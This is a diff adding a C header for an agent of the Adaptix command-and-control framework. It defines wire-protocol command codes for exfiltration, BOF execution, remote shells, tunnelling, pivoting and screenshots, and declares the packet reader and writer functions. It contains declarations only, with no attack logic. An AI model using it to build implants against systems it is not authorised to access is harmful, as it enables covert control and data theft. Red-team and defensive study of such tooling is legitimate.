@@ -1,0 +1,132 @@
+// __NAME__ Agent — Wire Protocol (adaptix_default: RC4 + binary packing)
+//
+// Constants and types matching the Go adaptix_default wire format.
+// ReaderLE reads Little-Endian (server → agent), WriterBE writes Big-Endian (agent → server).
+#pragma once
+
+#include <stdint.h>
+#include <stdbool.h>
+
+// ─── Command codes (must match adaptix_default/constants.go.tmpl) ──────────────
+
+#define COMMAND_CAT          24
+#define COMMAND_COPY         12
+#define COMMAND_CD           8
+#define COMMAND_DISKS        15
+#define COMMAND_DOWNLOAD     32
+#define COMMAND_EXEC_BOF     50
+#define COMMAND_EXEC_BOF_OUT 51
+#define COMMAND_EXFIL        35
+#define COMMAND_GETUID       22
+#define COMMAND_JOBS_KILL    47
+#define COMMAND_JOB_LIST     46
+#define COMMAND_LINK         38
+#define COMMAND_LS           14
+#define COMMAND_MV           18
+#define COMMAND_MKDIR        27
+#define COMMAND_PIVOT_EXEC   37
+#define COMMAND_PS_LIST      41
+#define COMMAND_PS_KILL      42
+#define COMMAND_PS_RUN       43
+#define COMMAND_PROFILE      21
+#define COMMAND_PWD          4
+#define COMMAND_REV2SELF     23
+#define COMMAND_RM           17
+#define COMMAND_TERMINATE    10
+#define COMMAND_UNLINK       39
+#define COMMAND_UPLOAD       33
+
+#define COMMAND_TUNNEL_START_TCP  62
+#define COMMAND_TUNNEL_START_UDP  63
+#define COMMAND_TUNNEL_WRITE_TCP  64
+#define COMMAND_TUNNEL_WRITE_UDP  65
+#define COMMAND_TUNNEL_CLOSE      66
+#define COMMAND_TUNNEL_REVERSE    67
+#define COMMAND_TUNNEL_ACCEPT     68
+#define COMMAND_TUNNEL_PAUSE      69
+#define COMMAND_TUNNEL_RESUME     70
+
+#define COMMAND_SHELL_START   71
+#define COMMAND_SHELL_WRITE   72
+#define COMMAND_SHELL_CLOSE   73
+#define COMMAND_SHELL_ACCEPT  74
+
+#define COMMAND_JOB           0x8437
+#define COMMAND_SAVEMEMORY     0x2321
+#define COMMAND_ERROR         0x1111ffff
+
+// ─── Download states ───────────────────────────────────────────────────────────
+
+#define DOWNLOAD_START     0x1
+#define DOWNLOAD_CONTINUE  0x2
+#define DOWNLOAD_FINISH    0x3
+
+// ─── Job types & states ────────────────────────────────────────────────────────
+
+#define JOB_TYPE_LOCAL    0x1
+#define JOB_TYPE_REMOTE   0x2
+#define JOB_TYPE_PROCESS  0x3
+#define JOB_TYPE_SHELL    0x4
+
+#define JOB_STATE_STARTING  0x0
+#define JOB_STATE_RUNNING   0x1
+#define JOB_STATE_FINISHED  0x2
+#define JOB_STATE_KILLED    0x3
+
+// ─── BOF callback & error codes ────────────────────────────────────────────────
+
+#define CALLBACK_OUTPUT       0x0
+#define CALLBACK_OUTPUT_OEM   0x1e
+#define CALLBACK_OUTPUT_UTF8  0x20
+#define CALLBACK_ERROR        0x0d
+#define CALLBACK_CUSTOM       0x1000
+#define CALLBACK_CUSTOM_LAST  0x13ff
+
+#define CALLBACK_AX_SCREENSHOT    0x81
+#define CALLBACK_AX_DOWNLOAD_MEM  0x82
+
+#define BOF_ERROR_PARSE       0x101
+#define BOF_ERROR_SYMBOL      0x102
+#define BOF_ERROR_MAX_FUNCS   0x103
+#define BOF_ERROR_ENTRY       0x104
+#define BOF_ERROR_ALLOC       0x105
+
+// ─── Watermark ─────────────────────────────────────────────────────────────────
+
+#define PROTO_WATERMARK  0x__WATERMARK__
+
+// ─── ReaderLE — Little-Endian reader (server → agent) ──────────────────────────
+
+typedef struct {
+    const uint8_t* data;
+    uint32_t       size;
+    uint32_t       offset;
+} ReaderLE;
+
+void     ReaderLEInit(ReaderLE* r, const uint8_t* data, uint32_t size);
+uint8_t  ReaderLEReadUint8(ReaderLE* r);
+uint16_t ReaderLEReadUint16(ReaderLE* r);
+uint32_t ReaderLEReadUint32(ReaderLE* r);
+uint64_t ReaderLEReadUint64(ReaderLE* r);
+// Returns newly allocated string. Caller must free().
+char*    ReaderLEReadString(ReaderLE* r);
+// Returns pointer into the reader's buffer (NOT a copy). Writes length to *outLen.
+uint8_t* ReaderLEReadBytes(ReaderLE* r, uint32_t* outLen);
+
+// ─── WriterBE — Big-Endian writer (agent → server) ────────────────────────────
+
+typedef struct {
+    uint8_t* data;
+    uint32_t size;
+    uint32_t capacity;
+} WriterBE;
+
+WriterBE* WriterBEInit(uint32_t initialCap);
+void      WriterBEFree(WriterBE* w);
+void      WriterBEWriteUint8(WriterBE* w, uint8_t val);
+void      WriterBEWriteUint16(WriterBE* w, uint16_t val);
+void      WriterBEWriteUint32(WriterBE* w, uint32_t val);
+void      WriterBEWriteUint64(WriterBE* w, uint64_t val);
+void      WriterBEWriteString(WriterBE* w, const char* str);
+void      WriterBEWriteBytes(WriterBE* w, const uint8_t* buf, uint32_t len);
+void      WriterBEWriteBool(WriterBE* w, bool val);
